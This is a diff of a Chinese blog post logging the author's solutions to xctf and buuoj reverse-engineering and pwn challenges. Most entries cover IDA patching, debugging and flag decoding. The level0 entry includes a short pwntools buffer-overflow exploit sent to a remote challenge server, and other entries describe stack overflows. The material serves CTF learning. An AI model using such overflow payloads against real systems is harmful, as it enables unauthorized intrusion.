@@ -13,15 +13,15 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="HXDCHLl">
+  <meta name="author" content="Lin Xinjie">
   <meta name="keywords" content="">
   
-    <meta name="description" content="xctf babyre 第一次做smc程序，看了wp学了下打patch。 打开ida启动反汇编就发现judge是全程序的关键，但是judge在开头进行了异或操作，导致反汇编不出来。于是可以用ida打patch来让ida正确反汇编函数。   屏幕截图 2022-03-05 203908    屏幕截图 2022-03-05 204106  如果是花指令，就可以使用edit-pa">
+    <meta name="description" content="xctf babyre 第一次做smc程序，看了wp学了下打patch。 打开ida启动反汇编就发现judge是全程序的关键，但是judge在开头进行了异或操作，导致反汇编不出来。于是可以用ida打patch来让ida正确反汇编函数。   如果是花指令，就可以使用edit-patch programmer将字节码改成nop跳过花指令。如果是需要编写脚本来正确反编译，可以在file-script c">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctf做题记录1">
 <meta property="og:url" content="http://www.ooorz.site/2022/04/08/ctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/index.html">
 <meta property="og:site_name" content="Xinjie Lin&#39;s Blog">
-<meta property="og:description" content="xctf babyre 第一次做smc程序，看了wp学了下打patch。 打开ida启动反汇编就发现judge是全程序的关键，但是judge在开头进行了异或操作，导致反汇编不出来。于是可以用ida打patch来让ida正确反汇编函数。   屏幕截图 2022-03-05 203908    屏幕截图 2022-03-05 204106  如果是花指令，就可以使用edit-pa">
+<meta property="og:description" content="xctf babyre 第一次做smc程序，看了wp学了下打patch。 打开ida启动反汇编就发现judge是全程序的关键，但是judge在开头进行了异或操作，导致反汇编不出来。于是可以用ida打patch来让ida正确反汇编函数。   如果是花指令，就可以使用edit-patch programmer将字节码改成nop跳过花指令。如果是需要编写脚本来正确反编译，可以在file-script c">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s2.loli.net/2022/03/06/jfJm9ZKcvklN7AD.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/06/yIwe5nNEHupZjko.png">
@@ -37,7 +37,6 @@
 <meta property="og:image" content="https://s2.loli.net/2022/03/09/2drmO3ZFWlSquUC.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/09/gkRWBK7xM6uO82P.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/09/GSuEZMDIfP3VRsX.png">
-<meta property="og:image" content="e:\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-09%20190209.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/17/VWqNFBagMf6r8Tt.png">
 <meta property="og:image" content="https://s2.loli.net/2022/03/17/IgPLeS6KjBZGdiH.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/02/wJp4kgStd3HlcBX.png">
@@ -52,8 +51,6 @@
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/Ul1AuB53oJdmnEP.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/l2MWxZ5DurAQhOY.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/2KrZBMJloS5ezQI.png">
-<meta property="og:image" content="e:\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-27%20162817.png">
-<meta property="og:image" content="e:\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-27%20162832.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/xYinmkDd4MwXVPb.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/24RceGXmS7b8dys.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/3caQN7M6dX4Fk2A.png">
@@ -63,7 +60,6 @@
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/i9RMjdFw1O7Uyeh.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/m2YQHTCEdygw5bi.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/rOqGw3Eit6759Nn.png">
-<meta property="og:image" content="e:\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE\%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-30%20170311.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/zdgE82cBWfQeMku.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/A7Tz5ZsiQI1bqRH.png">
 <meta property="og:image" content="https://s2.loli.net/2022/04/08/T5uvUNApWwHFISn.png">
@@ -78,7 +74,7 @@
 <meta property="og:image" content="https://s2.loli.net/2022/04/03/BxicPIzN45TlebU.png">
 <meta property="article:published_time" content="2022-04-08T03:04:05.000Z">
 <meta property="article:modified_time" content="2024-10-19T08:34:39.772Z">
-<meta property="article:author" content="HXDCHLl">
+<meta property="article:author" content="Lin Xinjie">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="reverse">
 <meta name="twitter:card" content="summary_large_image">
@@ -276,7 +272,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          全文共有4.5k字
+          全文共有4.3k字
         
       </span>
     
@@ -288,7 +284,7 @@
         
         
           <!-- compatible with older versions-->
-          预计阅读时间为38分钟
+          预计阅读时间为36分钟
         
       </span>
     
@@ -330,130 +326,57 @@
             
               <div class="markdown-body">
                 
-                <h1 id="xctf-babyre">xctf babyre</h1>
+                <h1>xctf babyre</h1>
 <p>第一次做smc程序，看了wp学了下打patch。</p>
 <p>打开ida启动反汇编就发现judge是全程序的关键，但是judge在开头进行了异或操作，导致反汇编不出来。于是可以用ida打patch来让ida正确反汇编函数。</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/06/jfJm9ZKcvklN7AD.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-05 203908" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-05 203908</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/03/06/yIwe5nNEHupZjko.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-05 204106" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-05 204106</figcaption>
-</figure>
-<p>如果是花指令，就可以使用edit-patch
-programmer将字节码改成nop跳过花指令。如果是需要编写脚本来正确反编译，可以在file-script
-command里编写脚本(7.5无法直接使用patchbyte()指令，需要from idc_bc695
-import *）。</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/06/HuGaviSNzsCVOrA.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-05 204927" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-05 204927</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/06/jfJm9ZKcvklN7AD.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-05 203908"></p>
+<p><img src="https://s2.loli.net/2022/03/06/yIwe5nNEHupZjko.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-05 204106"></p>
+<p>如果是花指令，就可以使用edit-patch programmer将字节码改成nop跳过花指令。如果是需要编写脚本来正确反编译，可以在file-script command里编写脚本(7.5无法直接使用patchbyte()指令，需要from idc_bc695 import *）。</p>
+<p><img src="https://s2.loli.net/2022/03/06/HuGaviSNzsCVOrA.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-05 204927"></p>
 <p>然后再使用快捷键c重新生成汇编代码，发现已经有汇编代码正确生成，再使用快捷键p重新生成函数即可发现关键函数。</p>
-<h1 id="xctf-easyhook">xctf easyhook</h1>
+<h1>xctf easyhook</h1>
 <p>打开ida尝试进行静态分析，但因为太多干扰函数和复杂的winapi分析了半小时没分析出来（汗），看了下wp，说用动态调试好解决，于是便进行了动态调试分析。</p>
 <p>先直接让程序运行，直接在提示输入的函数下断点，运行输入后提示错误，说明判断条件在函数内部。进入函数后狂按f8，发现程序在writefile后会入栈一串加密的字符串，于是可以判定程序在此进行判断</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/06/PVj1pkTDelZYb3n.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-06 131739" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-06 131739</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/06/PVj1pkTDelZYb3n.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-06 131739"></p>
 <p>我在找加密后的flag这里掉了坑，一直以为后面call401240里给的This_is_not_the_flag是加密后的flag，导致写出的脚本一直得不到flag。后来看了wp才知道原来程序在加密后就直接进行了判断。</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/06/yDGY1LH5pItUb8M.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-06 131437" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-06 131437</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/06/yDGY1LH5pItUb8M.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-06 131437"></p>
 <p>最后写出脚本</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/06/zXLoJuFdkNMfCI2.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-06 131756" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-06 131756</figcaption>
-</figure>
-<h1 id="xctf-easyre">xctf EasyRe</h1>
+<p><img src="https://s2.loli.net/2022/03/06/zXLoJuFdkNMfCI2.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-06 131756"></p>
+<h1>xctf EasyRe</h1>
 <p>打开ida后反编译得到</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/06/S3HNRp1jhAU5eMk.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-06 153650" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-06 153650</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/06/S3HNRp1jhAU5eMk.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-06 153650"></p>
 <p>程序很简单就简单的异或，于是直接写脚本，但是却得到了反的flag:}NsDkw9sy3qPto4UqNx{galf</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/06/c4oD7YL8vx2dkqE.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-06 154358" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-06 154358</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/06/c4oD7YL8vx2dkqE.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-06 154358"></p>
 <p>于是开始找原因，后来在汇编代码中发现了问题，原来在汇编代码中，他是从后到前开始异或的，但是在反编译中却没编译出来。以后还是不能全部相信f5反编译。</p>
-<h1 id="xctf-mysterious">xctf mysterious</h1>
-<figure>
-<img src="https://s2.loli.net/2022/03/09/nwK1NJSGxfzhjsF.png" srcset="/img/loading.gif" lazyload
-alt="image-20220309163603717" />
-<figcaption aria-hidden="true">image-20220309163603717</figcaption>
-</figure>
-<p>打开ida发现是windows程序，打开winmain发现程序运算逻辑，先用getdlgitemtexta
-api输入内容，然后运用atoi将字符串转换成数字，然后将转换后的数字加一，再将转换后的数字变成字符串，最后拼接输出。这题我卡的地方就在于不知道atoi函数和itoa函数，导致我跟进进去没分析出来www</p>
+<h1>xctf mysterious</h1>
+<p><img src="https://s2.loli.net/2022/03/09/nwK1NJSGxfzhjsF.png" srcset="/img/loading.gif" lazyload alt="image-20220309163603717"></p>
+<p>打开ida发现是windows程序，打开winmain发现程序运算逻辑，先用getdlgitemtexta api输入内容，然后运用atoi将字符串转换成数字，然后将转换后的数字加一，再将转换后的数字变成字符串，最后拼接输出。这题我卡的地方就在于不知道atoi函数和itoa函数，导致我跟进进去没分析出来www</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp">itoa()函数<br><br>itoa():<span class="hljs-built_in">char</span> *itoa( <span class="hljs-built_in">int</span> <span class="hljs-keyword">value</span>, <span class="hljs-built_in">char</span> *<span class="hljs-built_in">string</span>,<span class="hljs-built_in">int</span> radix);<br><br>原型说明：<br><br><span class="hljs-keyword">value</span>：欲转换的数据。<br><span class="hljs-built_in">string</span>：目标字符串的地址。<br>radix：转换后的进制数，可以是<span class="hljs-number">10</span>进制、<span class="hljs-number">16</span>进制等，范围必须在 <span class="hljs-number">2</span><span class="hljs-number">-36</span>。<br><br>功能：将整数<span class="hljs-keyword">value</span> 转换成字符串存入<span class="hljs-built_in">string</span> 指向的内存空间 ,radix 为转换时所用基数(保存到字符串中的数据的进制基数)。<br>返回值：函数返回一个指向 str，无错误返回。<br></code></pre></td></tr></table></figure>
-<h1 id="xctf-parallel-comparator-200">xctf parallel-comparator-200</h1>
+<h1>xctf parallel-comparator-200</h1>
 <p>读源码的题</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/09/YOZcURWj3C9Es2J.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-09 185426" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-09 185426</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/09/YOZcURWj3C9Es2J.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-09 185426"></p>
 <p>首先题目标准流输入了一个长度为21的字符串，然后对字符串进行了操作，并返回1，接着看字符串处理</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/09/n1EfI4bq59hoXGv.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-09 185706" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-09 185706</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/09/n1EfI4bq59hoXGv.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-09 185706"></p>
 <p>先定义了一个随机数，随机数的范围为97-123</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/09/2drmO3ZFWlSquUC.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-09 185352" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-09 185352</figcaption>
-</figure>
-<p>后定义了一个二维数组 [] [0]存放随机数，[] [1]存放题目给定的数组，[]
-[2]存放用户输入的字符串</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/09/gkRWBK7xM6uO82P.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-09 185949" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-09 185949</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/09/2drmO3ZFWlSquUC.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-09 185352"></p>
+<p>后定义了一个二维数组  [] [0]存放随机数，[] [1]存放题目给定的数组，[] [2]存放用户输入的字符串</p>
+<p><img src="https://s2.loli.net/2022/03/09/gkRWBK7xM6uO82P.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-09 185949"></p>
 <p>这串代码意思是checking函数的返回值result必须全部为零，所以接着看checking函数内部</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/09/GSuEZMDIfP3VRsX.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-09 185342" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-09 185342</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/09/GSuEZMDIfP3VRsX.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-09 185342"></p>
 <p>再异或一次(argument[1]+argument[0])就可以得到flag，因为不知道随机数是多少所以采取暴力手法</p>
-<figure>
-<img src="E:\屏幕截图\屏幕截图%202022-03-09%20190209.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-09 190209" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-09 190209</figcaption>
-</figure>
+<p>![屏幕截图 2022-03-09 190209](E:\屏幕截图\屏幕截图 2022-03-09 190209.png)</p>
 <p>得到flag:lucky_hacker_you_are</p>
-<h1 id="xctf-testre">xctf testre</h1>
+<h1>xctf testre</h1>
 <figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">base64字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span class="hljs-number">0123456789</span>+/<br>base58字母表：<span class="hljs-number">123456789</span>ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz<br>base32字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="hljs-number">123456789</span><br>base16字母表：abcdefghijklmnopqrstuvwxyz<span class="hljs-number">123456789</span><br></code></pre></td></tr></table></figure>
 <p>打开后发现两个字母表一个是64一个是58,将字符串用这两个字母表尝试下可以得到flag</p>
-<h1 id="xctf-simple-check">xctf simple check</h1>
+<h1>xctf simple check</h1>
 <p>这道题尝试了下gdb调试和od调试,od调试没啥说的。主要是联系linux下的gdb调试。</p>
-<p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">常见的gdb命令符<br><br><span class="hljs-bullet">1.</span> file xxxxx 挂载文件<br><span class="hljs-bullet">2.</span> b xxxx 下断点<br><span class="hljs-bullet">3.</span> n 单步步过<br><span class="hljs-bullet">4.</span> r 运行程序<br><span class="hljs-bullet">5.</span> s 单步步入<br><span class="hljs-bullet">6.</span> quit 退出调试<br></code></pre></td></tr></table></figure></p>
+ <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">常见的gdb命令符<br><br><span class="hljs-bullet">1.</span> file xxxxx 挂载文件<br><span class="hljs-bullet">2.</span> b xxxx 下断点<br><span class="hljs-bullet">3.</span> n 单步步过<br><span class="hljs-bullet">4.</span> r 运行程序<br><span class="hljs-bullet">5.</span> s 单步步入<br><span class="hljs-bullet">6.</span> quit 退出调试<br></code></pre></td></tr></table></figure>
 <p>题目只要在check函数判断正确就可以输出flag，可以用动态调试将check函数返回的eax值手动改为1，强制判断正确，输出正确的flag。静态调试没分析出来，目前还在看题解的静态调试www</p>
-<h1 id="xctf-easyre-153">xctf easyre-153</h1>
+<h1>xctf easyre-153</h1>
 <p>打开程序找到main函数后，先对程序有个大致了解。</p>
-<figure>
-<img src="https://s2.loli.net/2022/03/17/VWqNFBagMf6r8Tt.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-17 194126" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-17 194126</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/03/17/IgPLeS6KjBZGdiH.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-17 194141" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-17 194141</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/03/17/VWqNFBagMf6r8Tt.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-17 194126"></p>
+<p><img src="https://s2.loli.net/2022/03/17/IgPLeS6KjBZGdiH.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-17 194141"></p>
 <p>看到关键函数只有一个printf函数，我猜测应该是程序ida在汇编是发生错误，有可能是题目故意让ida反编译不吹来。找到造成反编译错误点比较困难。</p>
 <p>但看到后面有两个连续的if判断，我最开始想到的方法是使用动态调试跳过这两个判断语句直接的到flag,但实际上在linux使用gdb调试时，我下断点调试时，不知道为啥gdb遇到输入的时候按ctrl+z或者ctrl+j无法结束输入（是我太菜了，悲）。没法结束判断条件就没法跳过后面的两个判断，所以gdb调试只能作罢。又开始了静态分析读代码。</p>
 <p>在查看了lol的汇编代码后，我发现确实是ida没有反汇编出来，于是只好一点一点看汇编。</p>
@@ -464,158 +387,66 @@ alt="屏幕截图 2022-03-17 194141" />
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;69800876143568214356928753&#x27;</span><br>a = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">ord</span>,a))<br>flag = <span class="hljs-string">&quot;&quot;</span><br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">9</span>]+a[<span class="hljs-number">25</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">10</span>]+a[<span class="hljs-number">21</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">17</span>]+a[<span class="hljs-number">18</span>])<br>flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">2</span>*a[<span class="hljs-number">12</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">8</span>]+a[<span class="hljs-number">9</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">4</span>]+a[<span class="hljs-number">5</span>])<br>flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">2</span>*a[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#得到值gehlehr，输入后发现不对。</span><br></code></pre></td></tr></table></figure>
 <p>又尝试了下反着输入，得到了flag</p>
 <p>有没有哪位同志可以解释下linux下gdb调试怎么才可以结束输入wwww,以后还是尝试用ida调试elf文件吧qaq</p>
-<h1 id="xctf-pwn-level0">xctf pwn level0</h1>
+<h1>xctf pwn level0</h1>
 <p>第一次做pwn题，题目就是简单的栈溢出，当允许写入的量超过了堆栈的就可以覆盖返回地址，从而让地址回到自己想要的地方</p>
-<figure>
-<img src="https://s2.loli.net/2022/04/02/wJp4kgStd3HlcBX.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 124518" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 124518</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/tbx24PnNFO6qLk1.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 124528" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 124528</figcaption>
-</figure>
+<p><img src="https://s2.loli.net/2022/04/02/wJp4kgStd3HlcBX.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 124518"></p>
+<p><img src="https://s2.loli.net/2022/04/08/tbx24PnNFO6qLk1.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 124528"></p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;111.200.241.222&quot;</span>,<span class="hljs-number">58857</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">136</span>+p64(<span class="hljs-number">0x0040059A</span>)<br>a.send(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure>
-<h1 id="xctf-pwn-level2">xctf pwn level2</h1>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/skNXIUP6cgSW9AF.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-24 231138" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-24 231138</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/6TVIYjS1ux45F3W.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-24 231201" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-24 231201</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/1VJxmnqko7TzNt9.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-24 231313" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-24 231313</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/JcIK8yeQ3vjE4SA.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-24 231725" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-24 231725</figcaption>
-</figure>
-<h1 id="xctf-pwn-guess_number">xctf pwn guess_number</h1>
+<h1>xctf pwn level2</h1>
+<p><img src="https://s2.loli.net/2022/04/08/skNXIUP6cgSW9AF.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-24 231138"></p>
+<p><img src="https://s2.loli.net/2022/04/08/6TVIYjS1ux45F3W.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-24 231201"></p>
+<p><img src="https://s2.loli.net/2022/04/08/1VJxmnqko7TzNt9.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-24 231313"></p>
+<p><img src="https://s2.loli.net/2022/04/08/JcIK8yeQ3vjE4SA.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-24 231725"></p>
+<h1>xctf pwn guess_number</h1>
 <p>gets(&amp;)漏洞，加上伪随机数。伪随机数的一个特点就是，只要我们将种子固定，那么它生成的随机数就是固定的。于是我们只要覆盖随机种子将它改成我们想要的种子即可，正好程序的v7数组的栈地址就在种子的上面。</p>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/CsomKFtd4eMz6V9.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 124944" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 124944</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/xbpOwuJalKd3DCz.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-04-02 125028" />
-<figcaption aria-hidden="true">屏幕截图 2022-04-02 125028</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/jxW46YmVycpAnLf.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-24 232138" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-24 232138</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/Ul1AuB53oJdmnEP.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-24 232155" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-24 232155</figcaption>
-</figure>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/l2MWxZ5DurAQhOY.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-24 232208" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-24 232208</figcaption>
-</figure>
-<h1 id="buuoj-pwn-ciscn_2019_n_1">buuoj pwn ciscn_2019_n_1</h1>
-<figure>
-<img src="https://s2.loli.net/2022/04/08/2KrZBMJloS5ezQI.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-27 162049" />
-<figcaption aria-hidden="true">屏幕截图 2022-03-27 162049</figcaption>
-</figure>
-<p>这道题很简单，利用gets函数可以无限输入的漏洞，把v1的栈溢出到v2，将v2的值改成题目要求的值，但我这里犯了个错误，我最开始的时候是想直接把v1,v2的栈直接溢出，然后覆盖原有的地址，直接返回到调用system("cat
-")的地址执行，结果写exp执行后一直timeout，后来才想到把把v1的栈溢出改v2的值。</p>
+<p><img src="https://s2.loli.net/2022/04/08/CsomKFtd4eMz6V9.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 124944"></p>
+<p><img src="https://s2.loli.net/2022/04/08/xbpOwuJalKd3DCz.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-04-02 125028"></p>
+<p><img src="https://s2.loli.net/2022/04/08/jxW46YmVycpAnLf.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-24 232138"></p>
+<p><img src="https://s2.loli.net/2022/04/08/Ul1AuB53oJdmnEP.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-24 232155"></p>
+<p><img src="https://s2.loli.net/2022/04/08/l2MWxZ5DurAQhOY.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-24 232208"></p>
+<h1>buuoj pwn ciscn_2019_n_1</h1>
+<p><img src="https://s2.loli.net/2022/04/08/2KrZBMJloS5ezQI.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2022-03-27 162049"></p>
+<p>这道题很简单，利用gets函数可以无限输入的漏洞，把v1的栈溢出到v2，将v2的值改成题目要求的值，但我这里犯了个错误，我最开始的时候是想直接把v1,v2的栈直接溢出，然后覆盖原有的地址，直接返回到调用system(“cat \flag”)的地址执行，结果写exp执行后一直timeout，后来才想到把把v1的栈溢出改v2的值。</p>
 <p>要想让v2的值等于11.825，要先找到11.825的16进制值，因为11.825在内存中是以16进制形式存储的。找到后就可以直接写exp了。</p>
-<figure>
-<img src="E:\屏幕截图\屏幕截图%202022-03-27%20162817.png" srcset="/img/loading.gif" lazyload
-alt="屏幕截图 2022-03-27 162817" />
